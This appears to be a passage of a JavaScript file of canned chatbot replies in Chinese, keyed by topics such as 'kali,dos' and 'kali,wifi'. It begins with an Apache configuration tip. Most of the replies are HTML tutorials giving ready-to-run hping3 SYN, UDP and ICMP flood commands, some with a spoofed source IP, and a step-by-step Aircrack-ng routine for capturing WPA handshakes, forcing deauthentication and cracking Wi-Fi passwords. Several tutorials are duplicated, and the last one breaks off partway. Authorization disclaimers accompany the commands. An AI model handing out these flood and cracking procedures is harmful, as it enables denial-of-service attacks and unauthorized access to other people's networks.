        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog $APACHE_LOG_DIR/error.log
        CustomLog $APACHE_LOG_DIR/access.log combined
<b>
    &lt;Directory /var/www/html&gt;
         Options -Indexes
         DirectoryIndex index.html
    &lt;/Directory&gt; 
</b>
        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with &quot;a2disconf&quot;.
        #Include conf-available/serve-cgi-bin.conf
&lt;/VirtualHost&gt;

</code></pre>

<p>将这段代码写进ErrorLog, CustomLog 的下方:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
<b> #把这段代码写进去:

    &lt;Directory /var/www/html&gt;
         Options -Indexes
         DirectoryIndex index.html
    &lt;/Directory&gt; 
</b>
</code></pre>
<p> 之后按下ctrl + o 按下enter 回车键，再按下 ctrl + x 保存代码，再在终端重新启动 Apache服务器 >> sudo systemctl restart apache2</p>
  <p><strong>注意：</strong>如果关闭KALI 那么服务器将会中断，网站就访问不了。所以必须开机。也不要在 网站中写入任何 重要信息 如 名字，号码，联系方式和外部链接。</p>
            `,
          ],
        },





        "网页,代码": {
            reply: [
                `<p>好，那随便给你一个网页代码 比如 淘宝: </p> <br><br> <h4>以下是源码:</h4> <iframe src=""></iframe>`,
                `1`
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },






        "kali,hping3": {
            reply: [
                `
                  <h1>如何在 Kali Linux 中使用 hping3 进行服务器压力测试</h1>

  <p>
    <strong>说明：</strong> <code>hping3</code> 是一款功能强大的网络测试工具，常用于模拟各种协议的数据包进行发送。适用于防火墙测试、DoS 模拟、端口扫描、TTL 检测等多种合法用途。
  </p>

  <h2>基础准备</h2>
  <p>在 Kali 中安装（若尚未安装）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo apt update && sudo apt install hping3
  </code>

  <h2>常见的 hping3 压力测试用法</h2>

  <p><strong>1. TCP SYN Flood（模拟三次握手第一步，常用于 DoS 测试）</strong></p>
  <p>模拟大量 SYN 请求攻击服务器：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -p 80 --flood 192.168.1.100
  </code>
  <ul>
    <li><code>-S</code>：SYN 标志位</li>
    <li><code>-p 80</code>：目标端口为 80</li>
    <li><code>--flood</code>：最大速率发送，去掉速率控制（非常激烈）</li>
  </ul>

  <p><strong>2. UDP Flood（向目标发送大量 UDP 数据包）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 --udp -p 53 --flood 192.168.1.100
  </code>
  <ul>
    <li>常用于测试 DNS/UDP 防护能力（如 53、123 端口）</li>
  </ul>

  <p><strong>3. ICMP Flood（伪造大量 ping 请求）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 --icmp --flood 192.168.1.100
  </code>

  <p><strong>4. 自定义源地址（伪造 IP 以绕过 IP 限制测试）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -a 1.2.3.4 -p 80 --flood 192.168.1.100
  </code>
  <ul>
    <li><code>-a</code> 伪造源 IP 地址（需路由器不丢弃）</li>
  </ul>

  <p><strong>5. 控制发送速率（避免瞬时过载）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -p 80 -i u1000 192.168.1.100
  </code>
  <ul>
    <li><code>-i u1000</code> 表示每 1000 微秒（即每毫秒）发送一个包</li>
    <li>可根据目标承载能力调整发送速率</li>
  </ul>

  <p><strong>6. 扫描指定端口范围（服务存活探测）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -p ++50 -c 100 192.168.1.100
  </code>
  <ul>
    <li><code>-p ++50</code> 从端口 50 开始递增扫描</li>
    <li><code>-c 100</code> 共发送 100 个数据包</li>
  </ul>



  <h2>总结</h2>
  <p>
    <code>hping3</code> 是进行网络协议压力模拟、主机防护测试的重要工具之一，配合 <code>iptables</code>、<code>fail2ban</code> 等防御机制测试效果更佳。
  </p>
                `,
                `
                
  <h1>在 Kali Linux 中使用 hping3 进行合法服务器压力测试</h1>

  <p>
    <strong>hping3</strong> 是一款用于网络封包生成的命令行工具，功能涵盖 TCP/IP 包伪造、DoS 测试、端口扫描、协议分析等。在渗透测试和红队演练中，它是经典的轻量级攻击模拟器。
  </p>

  <h2>基础使用：TCP SYN Flood</h2>

  <p>
    最基础也最常用的测试方法是 SYN Flood，它通过向目标服务器大量发送 SYN 报文，占用服务端连接资源，模拟 TCP 半连接攻击。执行以下命令：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S --flood -p 80 192.168.1.100
  </code>

  <p>
    该命令的核心在于 <code>-S</code> 表示 SYN 位标志，<code>--flood</code> 强制以最大速率持续发送，而 <code>-p 80</code> 是目标端口，适合测试 Web 服务（如 Nginx、Apache）是否具备 SYN 防护。
  </p>

  <h2>UDP 测试：绕过基于 TCP 的过滤</h2>

  <p>
    若目标服务器主要基于 UDP（如 DNS、NTP 服务），则可以使用以下命令构造大量的无连接数据包进行测试：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 --udp --flood -p 53 192.168.1.100
  </code>

  <p>
    这将对 DNS 端口 53 进行压力测试。UDP 不建立连接，因此响应处理依赖服务器自身资源管理，攻击面与 TCP 完全不同。
  </p>

  <h2>ICMP（Ping Flood）测试</h2>

  <p>
    使用 ICMP 类型的请求，可以模拟传统 ping flood 攻击。这类攻击尤其适合测试路由器、网关设备或应用层 ICMP 限速策略是否生效：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 --icmp --flood 192.168.1.100
  </code>

  <p>
    虽然现代设备对 ICMP 多有限速，但它依然是一个轻量测试手段，适合低风险环境初步测试连通性与丢包处理能力。
  </p>

  <h2>伪造源地址：检测反射和绕过机制</h2>

  <p>
    在某些场景下，我们需要测试目标服务器对于伪造源地址的应对机制。可通过 <code>-a</code> 参数指定任意源 IP（适合反射/放大分析）：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S -a 1.2.3.4 -p 80 --flood 192.168.1.100
  </code>

  <p>
    注意，这种测试方法要求网络环境不做源 IP 检查（通常只有在本地模拟环境或 VPN 流量回环中有效）。
  </p>

  <h2>速率控制与定向打击</h2>

  <p>
    为避免立即造成服务崩溃，可以使用微秒级别的发送控制参数 <code>-i uXXX</code> 控制速率。例如，每毫秒发送一个数据包：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S -p 443 -i u1000 192.168.1.100
  </code>

  <p>
    这种方式更温和，适用于模拟持续中等压力情况，适合进行服务 QoS 测试或分布式负载回放。
  </p>

  <h2>扩展功能：端口扫描与服务识别</h2>

  <p>
    除了压力测试，<code>hping3</code> 还能执行“隐式扫描”，用较低层级协议对端口存活进行探测：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S -p ++80 -c 50 192.168.1.100
  </code>

  <p>
    该命令会逐步递增端口（从 80 开始），总共发送 50 个探测包。适合模拟低噪声探测，绕过传统端口扫描检测机制。
  </p>

  <h2>总结与合法性提醒</h2>

  <p>
    <strong>hping3</strong> 是一款极具威力的网络模拟工具，适合用于服务性能测试、安全策略验证与漏洞复现。但<strong>必须严格在授权范围内使用</strong>，否则将违反网络安全法律法规，后果严重。
  </p>

  <p>
    推荐配合 <code>tcpdump</code> 或 <code>Wireshark</code> 抓包工具分析流量响应，并将测试过程文档化，便于复现与汇报。
  </p>
                `
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },


        "kali,dos": {
            reply: [
                `
                  <h1>如何在 Kali Linux 中使用 hping3 进行服务器压力测试</h1>

  <p>
    <strong>说明：</strong> <code>hping3</code> 是一款功能强大的网络测试工具，常用于模拟各种协议的数据包进行发送。适用于防火墙测试、DoS 模拟、端口扫描、TTL 检测等多种合法用途。
  </p>

  <h2>基础准备</h2>
  <p>在 Kali 中安装（若尚未安装）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo apt update && sudo apt install hping3
  </code>

  <h2>常见的 hping3 压力测试用法</h2>

  <p><strong>1. TCP SYN Flood（模拟三次握手第一步，常用于 DoS 测试）</strong></p>
  <p>模拟大量 SYN 请求攻击服务器：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -p 80 --flood 192.168.1.100
  </code>
  <ul>
    <li><code>-S</code>：SYN 标志位</li>
    <li><code>-p 80</code>：目标端口为 80</li>
    <li><code>--flood</code>：最大速率发送，去掉速率控制（非常激烈）</li>
  </ul>

  <p><strong>2. UDP Flood（向目标发送大量 UDP 数据包）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 --udp -p 53 --flood 192.168.1.100
  </code>
  <ul>
    <li>常用于测试 DNS/UDP 防护能力（如 53、123 端口）</li>
  </ul>

  <p><strong>3. ICMP Flood（伪造大量 ping 请求）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 --icmp --flood 192.168.1.100
  </code>

  <p><strong>4. 自定义源地址（伪造 IP 以绕过 IP 限制测试）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -a 1.2.3.4 -p 80 --flood 192.168.1.100
  </code>
  <ul>
    <li><code>-a</code> 伪造源 IP 地址（需路由器不丢弃）</li>
  </ul>

  <p><strong>5. 控制发送速率（避免瞬时过载）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -p 80 -i u1000 192.168.1.100
  </code>
  <ul>
    <li><code>-i u1000</code> 表示每 1000 微秒（即每毫秒）发送一个包</li>
    <li>可根据目标承载能力调整发送速率</li>
  </ul>

  <p><strong>6. 扫描指定端口范围（服务存活探测）</strong></p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo hping3 -S -p ++50 -c 100 192.168.1.100
  </code>
  <ul>
    <li><code>-p ++50</code> 从端口 50 开始递增扫描</li>
    <li><code>-c 100</code> 共发送 100 个数据包</li>
  </ul>



  <h2>总结</h2>
  <p>
    <code>hping3</code> 是进行网络协议压力模拟、主机防护测试的重要工具之一，配合 <code>iptables</code>、<code>fail2ban</code> 等防御机制测试效果更佳。
  </p>
                `,
                `
                
  <h1>在 Kali Linux 中使用 hping3 进行合法服务器压力测试</h1>

  <p>
    <strong>hping3</strong> 是一款用于网络封包生成的命令行工具，功能涵盖 TCP/IP 包伪造、DoS 测试、端口扫描、协议分析等。在渗透测试和红队演练中，它是经典的轻量级攻击模拟器。
  </p>

  <h2>基础使用：TCP SYN Flood</h2>

  <p>
    最基础也最常用的测试方法是 SYN Flood，它通过向目标服务器大量发送 SYN 报文，占用服务端连接资源，模拟 TCP 半连接攻击。执行以下命令：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S --flood -p 80 192.168.1.100
  </code>

  <p>
    该命令的核心在于 <code>-S</code> 表示 SYN 位标志，<code>--flood</code> 强制以最大速率持续发送，而 <code>-p 80</code> 是目标端口，适合测试 Web 服务（如 Nginx、Apache）是否具备 SYN 防护。
  </p>

  <h2>UDP 测试：绕过基于 TCP 的过滤</h2>

  <p>
    若目标服务器主要基于 UDP（如 DNS、NTP 服务），则可以使用以下命令构造大量的无连接数据包进行测试：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 --udp --flood -p 53 192.168.1.100
  </code>

  <p>
    这将对 DNS 端口 53 进行压力测试。UDP 不建立连接，因此响应处理依赖服务器自身资源管理，攻击面与 TCP 完全不同。
  </p>

  <h2>ICMP（Ping Flood）测试</h2>

  <p>
    使用 ICMP 类型的请求，可以模拟传统 ping flood 攻击。这类攻击尤其适合测试路由器、网关设备或应用层 ICMP 限速策略是否生效：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 --icmp --flood 192.168.1.100
  </code>

  <p>
    虽然现代设备对 ICMP 多有限速，但它依然是一个轻量测试手段，适合低风险环境初步测试连通性与丢包处理能力。
  </p>

  <h2>伪造源地址：检测反射和绕过机制</h2>

  <p>
    在某些场景下，我们需要测试目标服务器对于伪造源地址的应对机制。可通过 <code>-a</code> 参数指定任意源 IP（适合反射/放大分析）：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S -a 1.2.3.4 -p 80 --flood 192.168.1.100
  </code>

  <p>
    注意，这种测试方法要求网络环境不做源 IP 检查（通常只有在本地模拟环境或 VPN 流量回环中有效）。
  </p>

  <h2>速率控制与定向打击</h2>

  <p>
    为避免立即造成服务崩溃，可以使用微秒级别的发送控制参数 <code>-i uXXX</code> 控制速率。例如，每毫秒发送一个数据包：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S -p 443 -i u1000 192.168.1.100
  </code>

  <p>
    这种方式更温和，适用于模拟持续中等压力情况，适合进行服务 QoS 测试或分布式负载回放。
  </p>

  <h2>扩展功能：端口扫描与服务识别</h2>

  <p>
    除了压力测试，<code>hping3</code> 还能执行“隐式扫描”，用较低层级协议对端口存活进行探测：
  </p>

  <code style="background-color:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo hping3 -S -p ++80 -c 50 192.168.1.100
  </code>

  <p>
    该命令会逐步递增端口（从 80 开始），总共发送 50 个探测包。适合模拟低噪声探测，绕过传统端口扫描检测机制。
  </p>

  <h2>总结与合法性提醒</h2>

  <p>
    <strong>hping3</strong> 是一款极具威力的网络模拟工具，适合用于服务性能测试、安全策略验证与漏洞复现。但<strong>必须严格在授权范围内使用</strong>，否则将违反网络安全法律法规，后果严重。
  </p>

  <p>
    推荐配合 <code>tcpdump</code> 或 <code>Wireshark</code> 抓包工具分析流量响应，并将测试过程文档化，便于复现与汇报。
  </p>
                `
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },



        "kali,aircrack": {
            reply: [

              `
                <h1>Kali Linux 下使用 Aircrack-ng 破解 Wi-Fi 密码的完整流程（合法授权）</h1>

  <p>
    <strong>Aircrack-ng</strong> 是一款专业的无线网络渗透测试工具，可用于抓取 Wi-Fi 握手包并通过字典破解密码。以下是一步一步的使用流程。<br>
  </p>

  <hr>

  <h2>1. 检查无线网卡并切换为监听模式</h2>

  <p>首先查看你的无线网卡名称，输入以下命令：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>例如结果中显示的是 <code>wlan0</code>，表示你的无线接口名称。</p>

  <p>将其切换到监听（monitor）模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这通常会生成一个名为 <code>wlan0mon</code> 的接口，后续所有操作都基于此。</p>

  <hr>

  <h2>2. 扫描附近的 Wi-Fi 网络</h2>

  <p>使用监听模式接口扫描附近所有无线网络：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记下目标网络的以下信息：</p>
  <ul>
    <li><strong>BSSID：</strong> 路由器的 MAC 地址</li>
    <li><strong>CHANNEL：</strong> 信道（如 1、6、11）</li>
    <li><strong>ESSID：</strong> Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>3. 锁定目标网络并捕获握手包</h2>

  <p>将目标固定下来，替换为你的 BSSID、频道和保存路径：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>说明：</p>
  <ul>
    <li><code>--bssid</code> 后跟目标路由器 MAC</li>
    <li><code>-c</code> 为频道号</li>
    <li><code>-w</code> 为保存握手包文件名（不要加扩展名）</li>
  </ul>

  <p>保持这个窗口开启，它将持续监听是否捕获握手。</p>

  <hr>

  <h2>4. 使用 deauth 攻击强制设备重新连接（从而获得握手）</h2>

  <p>在另一个终端执行以下命令发出 deauth（断开）请求，替换为目标 BSSID：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此操作会向目标路由广播 10 个断开请求，促使客户端重新连接，从而在监听窗口捕获到握手数据。</p>

  <hr>

  <h2>5. 确认捕获到握手</h2>

  <p>在监听窗口（<code>airodump-ng</code>）中如果右上角出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>
  <p>说明握手捕获成功，可以关闭该窗口。</p>

  <hr>

  <h2>6. 使用 Aircrack-ng 破解握手文件</h2>

  <p>准备一个字典（如 <code>/usr/share/wordlists/rockyou.txt</code>）并开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>其中：</p>
  <ul>
    <li><code>-w</code> 是字典文件</li>
    <li><code>-b</code> 是目标 BSSID</li>
    <li><code>.cap</code> 是抓到的握手包</li>
  </ul>

  <p>破解成功后会显示 Wi-Fi 密码。</p>

  <hr>

  <h2>7. 常见问题</h2>

  <ul>
    <li>确保无线网卡支持注入模式（monitor mode）</li>
    <li>如果未成功抓握手，多尝试几次 deauth 攻击</li>
    <li>字典文件越大，破解成功率越高，但耗时更长</li>
  </ul>
              `,
              `
                <h1>在 Kali Linux 中使用 Aircrack-ng 进行 WPA/WPA2 Wi-Fi 密码渗透测试</h1>

  <p><strong>适用范围：</strong>本教程适用于持有合法授权的渗透测试人员，演示如何利用 Aircrack-ng 工具集，对无线网络进行握手捕获与密码破解操作。</p>

  <p><strong>前提条件：</strong></p>
  <ul>
    <li>Kali Linux 系统已安装</li>
    <li>具备支持监听模式（Monitor Mode）和数据包注入（Packet Injection）的无线网卡</li>
    <li>合法测试授权</li>
  </ul>

  <hr>

  <h2>步骤一：识别无线网卡并启用监听模式</h2>

  <p>使用 <code>iwconfig</code> 查看无线接口名称：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>开启监听模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这将创建一个新接口，例如 <code>wlan0mon</code>，用于监听 Wi-Fi 通信。</p>

  <hr>

  <h2>步骤二：扫描目标无线网络</h2>

  <p>启动监听扫描以获取附近无线网络的信息：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记录目标网络的以下参数：</p>
  <ul>
    <li><strong>BSSID</strong>：MAC 地址</li>
    <li><strong>Channel</strong>：频道号</li>
    <li><strong>ESSID</strong>：Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>步骤三：锁定目标并捕获握手包</h2>

  <p>用下列命令锁定目标网络并将抓包保存到指定位置：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>--bssid</code>：目标路由器 MAC 地址</li>
    <li><code>-c</code>：信道</li>
    <li><code>-w</code>：输出文件路径（.cap 文件将自动生成）</li>
  </ul>

  <hr>

  <h2>步骤四：执行 deauthentication 攻击以强制客户端断线</h2>

  <p>为触发握手包，需主动断开连接中的客户端：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 15 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此命令将向目标路由器广播 15 次断线请求。握手过程通常会在此时被捕获。</p>

  <hr>

  <h2>步骤五：验证握手是否成功</h2>

  <p>返回 <code>airodump-ng</code> 窗口，右上角若出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>

  <p>即表示握手已成功捕获，接下来可进行密码破解。</p>

  <hr>

  <h2>步骤六：使用 Aircrack-ng 进行密码破解</h2>

  <p>准备字典文件，例如 Kali 自带的 rockyou.txt：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  </code>

  <p>开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>-w</code>：字典路径</li>
    <li><code>-b</code>：目标路由 BSSID</li>
    <li><code>.cap</code>：抓取到的握手数据包文件</li>
  </ul>

  <p>若密码存在于字典中，破解完成后将在终端中显示。</p>

  <hr>

  <h2>附录：常见问题与优化建议</h2>

  <ul>
    <li>确认无线网卡支持 Monitor 与 Injection（可使用 <code>airmon-ng</code> 检查）</li>
    <li>如无设备连接 AP，握手无法产生，建议用手机/虚拟机连接该网络再断开</li>
    <li>若字典破解失败，可考虑使用 GPU 并发工具（如 Hashcat）</li>
  </ul>
              `
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },


        "kali,wifi": {
            reply: [

              `
                <h1>Kali Linux 下使用 Aircrack-ng 破解 Wi-Fi 密码的完整流程（合法授权）</h1>

  <p>
    <strong>Aircrack-ng</strong> 是一款专业的无线网络渗透测试工具，可用于抓取 Wi-Fi 握手包并通过字典破解密码。以下是一步一步的使用流程。<br>
  </p>

  <hr>

  <h2>1. 检查无线网卡并切换为监听模式</h2>

  <p>首先查看你的无线网卡名称，输入以下命令：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>例如结果中显示的是 <code>wlan0</code>，表示你的无线接口名称。</p>

  <p>将其切换到监听（monitor）模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这通常会生成一个名为 <code>wlan0mon</code> 的接口，后续所有操作都基于此。</p>

  <hr>

  <h2>2. 扫描附近的 Wi-Fi 网络</h2>

  <p>使用监听模式接口扫描附近所有无线网络：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记下目标网络的以下信息：</p>
  <ul>
    <li><strong>BSSID：</strong> 路由器的 MAC 地址</li>
    <li><strong>CHANNEL：</strong> 信道（如 1、6、11）</li>
    <li><strong>ESSID：</strong> Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>3. 锁定目标网络并捕获握手包</h2>

  <p>将目标固定下来，替换为你的 BSSID、频道和保存路径：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>说明：</p>
  <ul>
    <li><code>--bssid</code> 后跟目标路由器 MAC</li>
    <li><code>-c</code> 为频道号</li>
    <li><code>-w</code> 为保存握手包文件名（不要加扩展名）</li>
  </ul>

  <p>保持这个窗口开启，它将持续监听是否捕获握手。</p>

  <hr>

  <h2>4. 使用 deauth 攻击强制设备重新连接（从而获得握手）</h2>

  <p>在另一个终端执行以下命令发出 deauth（断开）请求，替换为目标 BSSID：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此操作会向目标路由广播 10 个断开请求，促使客户端重新连接，从而在监听窗口捕获到握手数据。</p>

  <hr>

  <h2>5. 确认捕获到握手</h2>

  <p>在监听窗口（<code>airodump-ng</code>）中如果右上角出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>
  <p>说明握手捕获成功，可以关闭该窗口。</p>

  <hr>

  <h2>6. 使用 Aircrack-ng 破解握手文件</h2>

  <p>准备一个字典（如 <code>/usr/share/wordlists/rockyou.txt</code>）并开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>其中：</p>
  <ul>
    <li><code>-w</code> 是字典文件</li>
    <li><code>-b</code> 是目标 BSSID</li>
    <li><code>.cap</code> 是抓到的握手包</li>
  </ul>

  <p>破解成功后会显示 Wi-Fi 密码。</p>

  <hr>

  <h2>7. 常见问题</h2>

  <ul>
    <li>确保无线网卡支持注入模式（monitor mode）</li>
    <li>如果未成功抓握手，多尝试几次 deauth 攻击</li>
    <li>字典文件越大，破解成功率越高，但耗时更长</li>
  </ul>
              `,
              `
                <h1>在 Kali Linux 中使用 Aircrack-ng 进行 WPA/WPA2 Wi-Fi 密码渗透测试</h1>

  <p><strong>适用范围：</strong>本教程适用于持有合法授权的渗透测试人员，演示如何利用 Aircrack-ng 工具集，对无线网络进行握手捕获与密码破解操作。</p>

  <p><strong>前提条件：</strong></p>
  <ul>
    <li>Kali Linux 系统已安装</li>
    <li>具备支持监听模式（Monitor Mode）和数据包注入（Packet Injection）的无线网卡</li>
    <li>合法测试授权</li>
  </ul>

  <hr>

  <h2>步骤一：识别无线网卡并启用监听模式</h2>

  <p>使用 <code>iwconfig</code> 查看无线接口名称：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>开启监听模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这将创建一个新接口，例如 <code>wlan0mon</code>，用于监听 Wi-Fi 通信。</p>

  <hr>

  <h2>步骤二：扫描目标无线网络</h2>

  <p>启动监听扫描以获取附近无线网络的信息：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记录目标网络的以下参数：</p>
  <ul>
    <li><strong>BSSID</strong>：MAC 地址</li>
    <li><strong>Channel</strong>：频道号</li>
    <li><strong>ESSID</strong>：Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>步骤三：锁定目标并捕获握手包</h2>

  <p>用下列命令锁定目标网络并将抓包保存到指定位置：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>--bssid</code>：目标路由器 MAC 地址</li>
    <li><code>-c</code>：信道</li>
    <li><code>-w</code>：输出文件路径（.cap 文件将自动生成）</li>
  </ul>

  <hr>

  <h2>步骤四：执行 deauthentication 攻击以强制客户端断线</h2>

  <p>为触发握手包，需主动断开连接中的客户端：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 15 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此命令将向目标路由器广播 15 次断线请求。握手过程通常会在此时被捕获。</p>

  <hr>

  <h2>步骤五：验证握手是否成功</h2>

  <p>返回 <code>airodump-ng</code> 窗口，右上角若出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>

  <p>即表示握手已成功捕获，接下来可进行密码破解。</p>

  <hr>

  <h2>步骤六：使用 Aircrack-ng 进行密码破解</h2>

  <p>准备字典文件，例如 Kali 自带的 rockyou.txt：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  </code>

